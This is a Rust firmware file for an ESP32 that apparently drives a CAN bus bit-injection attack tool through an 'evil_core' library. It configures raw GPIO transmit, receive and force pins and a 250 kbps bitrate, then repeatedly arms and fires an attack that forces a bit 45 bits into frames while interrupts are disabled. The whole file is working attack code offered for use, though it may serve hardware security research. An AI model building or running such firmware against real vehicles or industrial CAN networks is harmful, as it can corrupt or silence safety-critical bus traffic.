#![no_std]
#![no_main]

mod spi_device;
mod soft_timer;
use soft_timer::SoftTimer;

use evil_core::{
    AttackCmd,
    BitStream,
    CanBitrates,
    EvilBsp,
    EvilCore,
    clock::TicksClock,
    tranceiver::Tranceiver
};

use embassy_executor::Spawner;
use esp_backtrace as _;
use esp_println as _;
use esp_hal::{
    delay::Delay,
    peripheral::Peripheral,
    prelude::*,
    spi::{ master::Spi, SpiMode },
    timer::timg::TimerGroup,
    gpio::{ Output, Input, Level, Pull },
    clock::Clocks
};

use defmt::{info, println};
use spi_device::CustomSpiDevice;

struct TimerBasedClock {
    timer: esp_hal::timer::timg::Timer<esp_hal::timer::timg::TimerX<<esp_hal::peripherals::TIMG1 as Peripheral>::P>, esp_hal::Blocking>,
}

impl TimerBasedClock {
    pub fn new(mut timer: esp_hal::timer::timg::Timer<esp_hal::timer::timg::TimerX<<esp_hal::peripherals::TIMG1 as Peripheral>::P>, esp_hal::Blocking>) -> Self {
        // Configure SysTick
        timer.set_counter_active(false);
        timer.set_alarm_active(false);
        timer.set_auto_reload(true);
        timer.reset_counter();
        timer.set_counter_decrementing(false);
        timer.set_counter_active(true);

        let apb_freq = Clocks::get().apb_clock.to_Hz();
        let divider = timer.divider();
        
        println!("APB clock freq: {} Hz", apb_freq);
        println!("Divider: {}", divider);
        println!("Timer freq: {} Hz", apb_freq/divider);
        
        Self { timer }
    }
}

impl TicksClock for TimerBasedClock {
    const TICKS_PER_SEC: u32 = 40_000_000; // Adjust this to match your timer frequency

    #[inline]
    fn ticks(&self) -> u32 {
        // Access timer registers to read current count
        let regs = self.timer.register_block().t(self.timer.timer_number().into());
        
        regs.update().write(|w| w.update().set_bit());
        while regs.update().read().update().bit_is_set() {
            // Wait for the update to complete
        }
        regs.lo().read().bits()
    }

    #[inline]
    fn add_ticks(t1: u32, t2: u32) -> u32 {
        // Handle potential overflow with wrapping_add
        t1.wrapping_add(t2)
    }
}

const GPIO_OUT_REG: *mut u32 = 0x3FF4_4004 as *mut u32;     // GPIO output register
const GPIO_OUT_W1TS_REG: *mut u32 = 0x3FF4_4008 as *mut u32; // GPIO bit set register
const GPIO_OUT_W1TC_REG: *mut u32 = 0x3FF4_400C as *mut u32; // GPIO bit clear register
const GPIO_IN_REG: *mut u32 = 0x3FF4_403c as *mut u32;     // GPIO input register

struct EspTranceiver<'a> {
    tx: Output<'a>,
    rx: Input<'a>,
    force: Output<'a>,
}

impl<'a> EspTranceiver<'a> {
    pub fn new(tx: Output<'a>, rx: Input<'a>, force: Output<'a>) -> Self {
        EspTranceiver { tx, rx, force }
    }
}

impl<'a> Tranceiver for EspTranceiver<'a> {
    #[inline]
    fn set_tx(&mut self, state: bool) {
        // Direct memory access to GPIO25 as output
        unsafe {
            if state {
                // Set GPIO25 high
                core::ptr::write_volatile(GPIO_OUT_W1TS_REG, 1 << 25);
            } else {
                // Set GPIO25 low
                core::ptr::write_volatile(GPIO_OUT_W1TC_REG, 1 << 25);
            }
        }
    }

    #[inline]
    fn get_rx(&self) -> bool {
        // Direct memory access to GPIO26 as input
        unsafe {
            // Read PA9 (bit 9) and check if it's high
            (core::ptr::read_volatile(GPIO_IN_REG) & (1 << 26)) != 0
        }
    }

    #[inline]
    fn set_force(&mut self, state: bool) {
        // Direct memory access to GPIO27 as output
        unsafe {
            if state {
                // Set GPIO27 high
                core::ptr::write_volatile(GPIO_OUT_W1TS_REG, 1 << 27);
            } else {
                // Set GPIO27 low
                core::ptr::write_volatile(GPIO_OUT_W1TC_REG, 1 << 27);
            }
        }
    }
}

#[no_mangle]
#[link_section = ".iram1.text"]
fn esp32_attack(core: &mut EvilCore<TimerBasedClock, EspTranceiver<'_>>) {
    xtensa_lx::interrupt::free(|_| {
        // Interrupts disabled
        core.attack();
    });
}

#[esp_hal_embassy::main]
async fn main(spawner: Spawner) {
    info!("Init!");
    let p = esp_hal::init(esp_hal::Config::default());

    let timg0 = TimerGroup::new(p.TIMG0);
    esp_hal_embassy::init(timg0.timer0);

    // Setup tx, rx, and force pins, and tranceiver
    let tx = Output::new(p.GPIO25, Level::Low);
    let rx = Input::new(p.GPIO26, Pull::None);
    let force = Output::new(p.GPIO27, Level::Low);

    let tranceiver = EspTranceiver::new(tx, rx, force);
    info!("Tranceiver init ok");

    // Create clock
    let timg1_t0: esp_hal::timer::timg::Timer<esp_hal::timer::timg::TimerX<<esp_hal::peripherals::TIMG1 as Peripheral>::P>, esp_hal::Blocking> = TimerGroup::new(p.TIMG1).timer0;
    let clock = TimerBasedClock::new(timg1_t0);

    // Create the EvilBsp
    let bsp = EvilBsp::new(clock, tranceiver);
    info!("BSP created");

    // Create and run the EvilDoggie core
    let mut core = EvilCore::new(bsp, CanBitrates::Kbps250, 2040);
    info!("Core created");

    Delay::new().delay_millis(100);

    loop {
    
        core.arm(
            &[
                // AttackCmd::Wait { bits: 1 },
                // AttackCmd::Force {
                //     stream: BitStream::from_u32(0b1010_1010, 8)
                // },
                AttackCmd::Wait { bits: 45 },
                AttackCmd::Force {
                    stream: BitStream::from_u32(0b1, 1)
                },
                // AttackCmd::Wait { bits: 22 },
                // AttackCmd::Force {
                //     stream: BitStream::from_u32(0b1, 1)
                // },
            ]
        ).unwrap();

        info!("Attack armed");

        esp32_attack(&mut core);

        info!("Attack has finished");
    }

}

// core_create_tasks!(
//     Uart<'static, Async>,
//     MCP2515<CustomSpiDevice<'static, Blocking>>
// );
